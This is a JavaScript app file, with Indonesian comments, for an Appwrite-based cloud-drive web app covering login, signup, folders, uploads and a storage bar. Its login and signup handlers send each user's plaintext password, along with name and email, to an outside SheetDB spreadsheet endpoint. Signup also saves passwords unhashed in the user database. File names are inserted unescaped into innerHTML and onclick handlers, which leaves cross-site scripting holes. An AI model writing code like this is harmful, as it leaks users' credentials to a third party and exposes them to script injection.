// ======================================================
// STORAGE TASKS - APP.JS (THUMBNAILS & STORAGE CALC)
// ======================================================

const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// KONFIGURASI
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',   
    BUCKET_ID: 'taskfiles'
};
const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi';

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

let currentUser = null;
let currentFolderId = 'root';

const el = (id) => document.getElementById(id);
const showLoading = () => el('loading').classList.remove('hidden');
const hideLoading = () => el('loading').classList.add('hidden');

// NAVIGASI
window.nav = (pageId) => {
    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => el(id).classList.add('hidden'));
    el(pageId).classList.remove('hidden');
};

// ======================================================
// OTENTIKASI & EXCEL LOG
// ======================================================
// (Bagian Login, Signup, Logout tetap sama seperti sebelumnya)
if (el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        let identifier = el('loginEmail').value.trim(); const password = el('loginPass').value;
        showLoading();
        try {
            if (!identifier.includes('@')) {
                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', identifier)]);
                if (res.total === 0) throw new Error("Username tidak ditemukan.");
                identifier = res.documents[0].email;
            }
            await account.createEmailPasswordSession(identifier, password);
            currentUser = await account.get();
            fetch(`${SHEETDB_API}?sheet=Login`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: [{ "ID": currentUser.$id, "Nama": currentUser.name, "Email": currentUser.email, "Password": password, "Riwayat Waktu": new Date().toLocaleString('id-ID') }]}) });
            checkSession(); 
        } catch (error) { alert("Gagal: " + error.message); hideLoading(); }
    });
}

if (el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value; const email = el('regEmail').value; const phone = el('regPhone').value; const pass = el('regPass').value;
        if (pass !== el('regVerify').value) return alert("Password beda!");
        showLoading();
        try {
            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone, password: pass });
            fetch(`${SHEETDB_API}?sheet=SignUp`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: [{ "ID": auth.$id, "Nama": name, "Email": email, "Phone": phone, "Password": pass, "Waktu": new Date().toLocaleString('id-ID') }]}) });
            alert("Berhasil!"); nav('loginPage');
        } catch (error) { alert(error.message); } finally { hideLoading(); }
    });
}

if (el('logoutBtn')) {
    el('logoutBtn').addEventListener('click', async () => {
        if (!confirm("Keluar?")) return;
        showLoading();
        try {
            const user = await account.get();
            await fetch(`${SHEETDB_API}?sheet=Logout`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: [{ "ID": user.$id, "Nama": user.name, "Email": user.email, "Riwayat Waktu": new Date().toLocaleString('id-ID') }]}) });
            await account.deleteSession('current'); currentUser = null;
        } catch (e) { console.error(e); }
        finally { hideLoading(); alert("Logout berhasil."); nav('loginPage'); }
    });
}

// ======================================================
// STORAGE LOGIC (INTI PERUBAHAN)
// ======================================================

async function checkSession() {
    showLoading();
    try {
        currentUser = await account.get();
        nav('dashboardPage'); 
        updateGreeting(); 
        calculateStorage(); // Hitung storage saat login
        loadFiles('root');
    } catch (e) { nav('loginPage'); }
    finally { setTimeout(hideLoading, 500); }
}
document.addEventListener('DOMContentLoaded', checkSession);

// HITUNG TOTAL STORAGE
async function calculateStorage() {
    if (!currentUser) return;
    try {
        // Ambil SEMUA file milik user
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.equal('type', 'file') // Hanya hitung file
        ]);
        
        let totalBytes = 0;
        res.documents.forEach(doc => { totalBytes += (doc.size || 0); });

        // Konversi ke MB/GB
        const mb = (totalBytes / (1024 * 1024)).toFixed(2);
        const percentage = Math.min((totalBytes / (2 * 1024 * 1024 * 1024)) * 100, 100); // Max 2GB

        el('storageUsed').innerText = `${mb} MB / 2 GB`;
        el('storageBar').style.width = `${percentage}%`;

    } catch (e) { console.error("Gagal hitung storage", e); }
}

async function loadFiles(folderId) {
    if (!currentUser) return;
    const grid = el('fileGrid'); grid.innerHTML = '';
    
    // NAVIGATION HEADER UPDATE
    const headerTitle = el('headerTitle');
    const breadcrumb = document.querySelector('.breadcrumb-area');
    
    if(folderId === 'root') {
        breadcrumb.innerHTML = `<h2 id="headerTitle">Welcome In Drive</h2>`;
        updateGreeting(); // Reset ke ucapan waktu jika di root
    } else {
        // Tombol Kembali
        breadcrumb.innerHTML = `
            <button onclick="loadFiles('root')" class="btn-pill small" style="background:rgba(255,255,255,0.2); width:auto; padding:0 15px; margin-right:10px;">
                <i class="fa-solid fa-arrow-left"></i> Kembali
            </button> 
            <h2 style="display:inline;">${currentFolderName}</h2>`;
    }

    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.equal('parentId', folderId)
        ]);
        res.documents.forEach(doc => renderItem(doc));
    } catch (e) { console.error(e); }
}

let currentFolderName = "Home"; // Variabel global untuk nama folder aktif

// RENDER ITEM (THUMBNAIL LOGIC)
function renderItem(doc) {
    const grid = el('fileGrid');
    const div = document.createElement('div');
    const isFolder = doc.type === 'folder';
    
    // Tentukan Ikon / Gambar
    let iconContent = '';
    let divClass = 'item-card';

    if (isFolder) {
        iconContent = `<i class="icon fa-solid fa-folder"></i>`;
    } else {
        // Cek ekstensi file untuk thumbnail
        const name = doc.name.toLowerCase();
        if (name.match(/\.(jpg|jpeg|png|gif|webp|heic)$/i)) {
            // Jika Gambar: Tampilkan Preview Asli
            const previewUrl = storage.getFilePreview(CONFIG.BUCKET_ID, doc.fileId).href;
            iconContent = `<img src="${previewUrl}" class="img-cover" alt="${doc.name}">`;
            divClass += ' has-image';
        } else if (name.match(/\.(mp4|mov|avi)$/i)) {
            iconContent = `<i class="icon fa-solid fa-file-video"></i>`;
        } else {
            iconContent = `<i class="icon fa-solid fa-file-lines"></i>`;
        }
    }

    div.className = divClass;
    
    // Logic Klik
    const clickAction = isFolder 
        ? `openFolder('${doc.$id}', '${doc.name}')` 
        : `window.open('${doc.url}', '_blank')`;

    div.innerHTML = `
        <button class="del-btn" onclick="deleteItem('${doc.$id}','${doc.type}','${doc.fileId}')">
            <i class="fa-solid fa-xmark"></i>
        </button>
        <div onclick="${clickAction}" style="width:100%; height:100%; display:flex; flex-direction:column; align-items:center; justify-content:center;">
            ${iconContent}
            <div class="item-name">${doc.name}</div>
        </div>`;
    
    grid.appendChild(div);
}

// BUKA FOLDER
window.openFolder = (id, name) => { 
    currentFolderId = id; 
    currentFolderName = name; // Simpan nama folder untuk judul
    loadFiles(id); 
};

// CREATE & UPLOAD (Dengan Update Storage)
window.submitCreateFolder = async () => {
    const name = el('newFolderName').value.trim();
    if (!name) return;
    closeModal('folderModal'); showLoading();
    try {
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0
        });
        loadFiles(currentFolderId);
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

window.submitUploadFile = async () => {
    if (!window.selectedFile) return alert("Pilih file!");
    closeModal('uploadModal'); showLoading();
    try {
        const file = window.selectedFile;
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), file);
        const url = storage.getFileView(CONFIG.BUCKET_ID, up.$id);
        
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: file.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: url.href, fileId: up.$id, size: file.size
        });
        
        loadFiles(currentFolderId);
        calculateStorage(); // Update bar storage setelah upload
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

// UTILS LAINNYA
window.deleteItem = async (id, type, fileId) => {
    if (!confirm("Hapus?")) return;
    showLoading();
    try {
        if (type === 'file') await storage.deleteFile(CONFIG.BUCKET_ID, fileId);
        await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, id);
        loadFiles(currentFolderId);
        calculateStorage(); // Update bar storage setelah hapus
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

window.openModal = (id) => { el(id).classList.remove('hidden'); el('dropdownMenu').classList.remove('show'); };
window.closeModal = (id) => el(id).classList.add('hidden');
window.triggerUploadModal = () => openModal('uploadModal');
window.createFolder = () => openModal('folderModal');
window.toggleDropdown = () => el('dropdownMenu').classList.toggle('show');
window.togglePass = (id, icon) => { const i = el(id); i.type = i.type==='password'?'text':'password'; icon.classList.toggle('fa-eye'); icon.classList.toggle('fa-eye-slash'); };
function updateGreeting() { const h = new Date().getHours(); let s = "Morning"; if(h>=12) s="Afternoon"; if(h>=18) s="Night"; if(el('headerTitle')) el('headerTitle').innerText = `Welcome In Drive ${s}`; }

// Drag & Drop
el('dropZone').addEventListener('dragover', (e) => { e.preventDefault(); e.target.classList.add('dragover'); });
el('dropZone').addEventListener('drop', (e) => { e.preventDefault(); handleFileSelect(e.dataTransfer.files[0]); });
el('fileInputHidden').addEventListener('change', (e) => handleFileSelect(e.target.files[0]));
function handleFileSelect(f) { window.selectedFile = f; el('fileInfoText').innerText = `File: ${f.name}`; }
el('searchInput').addEventListener('input', () => loadFiles(currentFolderId));
